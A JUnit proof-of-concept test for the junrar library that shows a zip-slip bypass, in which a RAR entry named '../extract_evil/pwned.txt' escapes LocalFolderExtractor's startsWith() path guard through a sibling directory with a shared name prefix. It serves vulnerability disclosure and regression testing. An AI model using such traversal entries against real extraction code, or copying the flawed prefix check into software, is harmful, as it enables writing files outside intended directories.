package com.github.junrar;

import com.github.junrar.rarfile.FileHeader;
import org.apache.commons.io.FileUtils;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;

/**
 * Demonstrates the zip-slip bypass in {@link LocalFolderExtractor} when the
 * extraction destination name is a string prefix of a sibling directory name.
 *
 * Archive entry : {@code ../extract_evil/pwned.txt}
 * Destination   : {@code <base>/extract}
 * Resolves to   : {@code <base>/extract_evil/pwned.txt}   ← outside sandbox
 *
 * Vulnerable guard (LocalFolderExtractor line 61):
 *   {@code "/…/extract_evil/pwned.txt".startsWith("/…/extract")  →  true}
 */
class PrefixCollisionPocTest {

    private File base;
    private File dest;
    private File sibling;

    @BeforeEach
    void setUp() throws IOException {
        base    = TestCommons.createTempDir();
        dest    = new File(base, "extract");
        sibling = new File(base, "extract_evil");
        dest.mkdirs();
        sibling.mkdirs();
    }

    @AfterEach
    void tearDown() throws IOException {
        FileUtils.deleteDirectory(base);
    }

    @Test
    void siblingPrefixTraversal_writesOutsideSandboxWithoutException() throws Exception {
        File rarFile = TestCommons.writeResourceToFolder(base, "sibling-prefix-traversal.rar");

        try (Archive archive = new Archive(rarFile)) {
            FileHeader fh = archive.nextFileHeader();
            LocalFolderExtractor extractor = new LocalFolderExtractor(dest);

            // Guard does not throw — the sibling prefix bypasses the startsWith() check
            assertThatCode(() -> extractor.extract(archive, fh))
                .doesNotThrowAnyException();
        }

        File written = new File(sibling, "pwned.txt");
        assertThat(written).exists();
        assertThat(FileUtils.readFileToString(written, StandardCharsets.UTF_8))
            .isEqualTo("written outside sandbox\n");
        assertThat(new File(dest, "pwned.txt")).doesNotExist();
    }
}
